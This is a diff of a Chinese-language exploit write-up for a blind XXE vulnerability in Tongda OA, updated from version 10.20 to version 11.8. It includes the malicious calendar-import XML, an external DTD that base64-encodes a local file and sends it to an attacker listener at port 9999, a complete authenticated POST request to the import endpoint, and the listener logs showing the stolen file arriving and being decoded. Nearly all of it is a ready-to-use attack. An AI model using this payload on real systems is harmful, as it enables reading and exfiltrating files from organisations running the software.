@@ -1,4 +1,4 @@
-# TONGDA OFFICE Anywhere 10.20.200417-bind XXE
+# TONGDA OA 11.8 bind XXE
 
 ## 漏洞描述
 
@@ -13,52 +13,47 @@
 ```xml
 <?xml version="1.0" encoding="gbk"?>
 <!DOCTYPE convert [ 
-<!ENTITY % remote SYSTEM "http://vps/xxe.dtd">
+<!ENTITY % remote SYSTEM "http://192.168.9.253/xxe.dtd">
 %remote;%int;%send;
 ]>
 <AFFAIRS>
   <AFFAIR>
     <FLAG>CALENDAR</FLAG>
-    <CAL_TIME>2020-08-19 20:00:00</CAL_TIME>
-    <END_TIME>2020-08-19 20:30:00</END_TIME>
-    <CAL_TYPE></CAL_TYPE>
-    <CAL_LEVEL>0</CAL_LEVEL>
-    <CONTENT>cyberlab</CONTENT>
-    <MANAGER_ID></MANAGER_ID>
-  </AFFAIR>
-  <AFFAIR>
-    <FLAG>CALENDAR</FLAG>
-    <CAL_TIME>2020-08-19 16:00:00</CAL_TIME>
-    <END_TIME>2020-08-19 16:30:00</END_TIME>
-    <CAL_TYPE>1</CAL_TYPE>
-    <CAL_LEVEL>0</CAL_LEVEL>
-    <CONTENT>11111</CONTENT>
-    <MANAGER_ID></MANAGER_ID>
+    <CONTENT>test222</CONTENT>
+    <CAL_TIME>2021-01-12 13:00</CAL_TIME>
+    <END_TIME>2021-01-12 14:00</END_TIME>
+    <LOCATION></LOCATION>
+    <CAL_TYPE>个人事务</CAL_TYPE>
+    <CAL_LEVEL>重要,不紧急</CAL_LEVEL>
+    <CALENDAR></CALENDAR>
+    <OWNER>系统管理员</OWNER>
+    <SHARE></SHARE>
+    <REMIND>事务提醒，提前5分发送提醒</REMIND>
   </AFFAIR>
 </AFFAIRS>
 ```
 
-远程vps主机创建xxe.dtd，内容如下所示，读取本地的flag.txt文件
+远程vps主机创建xxe.dtd，内容如下所示，读取本地的xxe.txt文件
 
 ```shell
 root@iZwz9akazugpwbrb1xtlw8Z:~# cat /tmp/tmp/xxe.dtd
-<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://D:/flag.txt">
-<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://vps:9999?p=%file;'>">
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file://e:/xxe.txt">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://192.168.9.253:9999?p=%file;'>">
 
 ```
 
 提供http server
 
 ```shell
-root@iZwz9akazugpwbrb1xtlw8Z:/tmp/tmp/recv# python -m SimpleHTTPServer 9999
-Serving HTTP on 0.0.0.0 port 9999 ...
+root@iZwz9akazugpwbrb1xtlw8Z:/tmp/tmp/recv#  python -m http.server 80 --bind 192.168.9.253
+Serving HTTP on 192.168.9.253 port 80 (http://192.168.9.253:80/) ...
 
 
 ```
 
 ```shell
-root@iZwz9akazugpwbrb1xtlw8Z:/tmp/tmp/# python -m SimpleHTTPServer 65531
-Serving HTTP on 0.0.0.0 port 65531 ...
+root@iZwz9akazugpwbrb1xtlw8Z:/tmp/tmp/# python -m http.server 9999 --bind 192.168.9.253
+Serving HTTP on 192.168.9.253 port 9999 (http://192.168.9.253:9999/) ...
 
 
 ```
@@ -70,64 +65,59 @@ Serving HTTP on 0.0.0.0 port 65531 ...
 提交如下poc：
 
 ```
-POST /general/calendar/in_out/import_xml.php HTTP/1.1
-Host: 127.0.0.1
-Content-Length: 1192
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Origin: http://211.138.191.187:88
-Content-Type: multipart/form-data; boundary=----WebKitFormBoundarym6iluHiJGivtWxrd
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Referer: http://127.0.0.1:88/general/calendar/in_out/
+POST /general/appbuilder/web/calendar/calendarimport/importoutlook HTTP/1.1
+Host: 192.168.9.80
+Content-Length: 1154
+Accept: application/json, text/javascript, */*; q=0.01
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary5BddLuBqRkyHXGkt
+Origin: http://192.168.9.80
+Referer: http://192.168.9.80/general/calendarArrange/calendarArrange.php
 Accept-Encoding: gzip, deflate
-Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
-Cookie: SID_1=9cdfdedc; SID_4002=fd08b4a7; USER_NAME_COOKIE=%C0%EE%D3%C2; OA_USER_ID=3795; PHPSESSID=r5dr5gthsdma6h40pcplgehen2; SID_3795=50974747
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=d8cei8mc8j7kamoah0je73ipp6; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=d7db144
 Connection: close
 
-------WebKitFormBoundarym6iluHiJGivtWxrd
-Content-Disposition: form-data; name="XML_FILE"; filename="日程.xml"
+------WebKitFormBoundary5BddLuBqRkyHXGkt
+Content-Disposition: form-data; name="importFile"; filename="�ョ�.xml"
 Content-Type: text/xml
 
 <?xml version="1.0" encoding="gbk"?>
 <!DOCTYPE convert [ 
-<!ENTITY % remote SYSTEM "http://vps:65531/xxe.dtd">
+<!ENTITY % remote SYSTEM "http://192.168.9.253/xxe.dtd">
 %remote;%int;%send;
 ]>
 <AFFAIRS>
   <AFFAIR>
     <FLAG>CALENDAR</FLAG>
-    <CAL_TIME>2020-08-19 20:00:00</CAL_TIME>
-    <END_TIME>2020-08-19 20:30:00</END_TIME>
-    <CAL_TYPE></CAL_TYPE>
-    <CAL_LEVEL>0</CAL_LEVEL>
-    <CONTENT>cyberlab</CONTENT>
-    <MANAGER_ID></MANAGER_ID>
+    <CONTENT>test222</CONTENT>
+    <CAL_TIME>2021-01-12 13:00</CAL_TIME>
+    <END_TIME>2021-01-12 14:00</END_TIME>
+    <LOCATION></LOCATION>
+    <CAL_TYPE>个人事务</CAL_TYPE>
+    <CAL_LEVEL>重要,不紧急</CAL_LEVEL>
+    <CALENDAR></CALENDAR>
+    <OWNER>系统管理员</OWNER>
+    <SHARE></SHARE>
+    <REMIND>事务提醒，提前5分发送提醒</REMIND>
   </AFFAIR>
   <AFFAIR>
     <FLAG>CALENDAR</FLAG>
-    <CAL_TIME>2020-08-19 16:00:00</CAL_TIME>
-    <END_TIME>2020-08-19 16:30:00</END_TIME>
-    <CAL_TYPE>1</CAL_TYPE>
-    <CAL_LEVEL>0</CAL_LEVEL>
-    <CONTENT>11111</CONTENT>
-    <MANAGER_ID></MANAGER_ID>
+    <CONTENT>test111</CONTENT>
+    <CAL_TIME>2021-01-11 13:00</CAL_TIME>
+    <END_TIME>2021-01-11 14:00</END_TIME>
+    <LOCATION></LOCATION>
+    <CAL_TYPE>工作事务</CAL_TYPE>
+    <CAL_LEVEL>不重要/不紧急</CAL_LEVEL>
+    <CALENDAR></CALENDAR>
+    <OWNER>系统管理员</OWNER>
+    <SHARE></SHARE>
+    <REMIND>事务提醒，提前5分发送提醒</REMIND>
   </AFFAIR>
 </AFFAIRS>
 
-------WebKitFormBoundarym6iluHiJGivtWxrd
-Content-Disposition: form-data; name="FILE_NAME"
-
-日程.xml
-------WebKitFormBoundarym6iluHiJGivtWxrd
-Content-Disposition: form-data; name="FROM_OUTLOOK_OA"
-
-2
-------WebKitFormBoundarym6iluHiJGivtWxrd
-Content-Disposition: form-data; name="CAL_AFF_TASK"
-
-1
-------WebKitFormBoundarym6iluHiJGivtWxrd--
+------WebKitFormBoundary5BddLuBqRkyHXGkt--
 
 ```
 
@@ -138,25 +128,25 @@ Content-Disposition: form-data; name="CAL_AFF_TASK"
 远程主机收到请求：
 
 ```shell
-python -m SimpleHTTPServer 65531
-Serving HTTP on 0.0.0.0 port 65531 ...
-127.0.0.1 - - [20/Aug/2020 11:04:23] "GET /xxe.dtd HTTP/1.0" 200 -
+ python -m http.server 80 --bind 192.168.9.253
+Serving HTTP on 192.168.9.253 port 80 (http://192.168.9.253:80/) ...
+192.168.9.80 - - [11/Jan/2021 13:07:04] "GET /xxe.dtd HTTP/1.0" 200 -
 
 ```
 
 监听端口收到了读取的本地文件内容，内容经过base64编码如下所示：
 
 ```shell
- python -m SimpleHTTPServer 9999
-Serving HTTP on 0.0.0.0 port 9999 ...
-127.0.0.1 - - [20/Aug/2020 11:04:23] "GET /?p=aXQncyB4eGUh HTTP/1.0" 200 -
+ python -m http.server 9999 --bind 192.168.9.253
+Serving HTTP on 192.168.9.253 port 9999 (http://192.168.9.253:9999/) ...
+192.168.9.80 - - [11/Jan/2021 13:07:04] "GET /?p=aXQncyB4eGUgdnVsbmVyYWJpbGl0eQ== HTTP/1.0" 200 -
 
 ```
 
 Base64解码，得到文件内容：
 
 ```shell
-root@kali:~# echo -n "aXQncyB4eGUh" |base64 -d
-it's xxe!
+echo -n 'aXQncyB4eGUgdnVsbmVyYWJpbGl0eQ==' | base64 -d
+it's xxe vulnerability
 ```
 
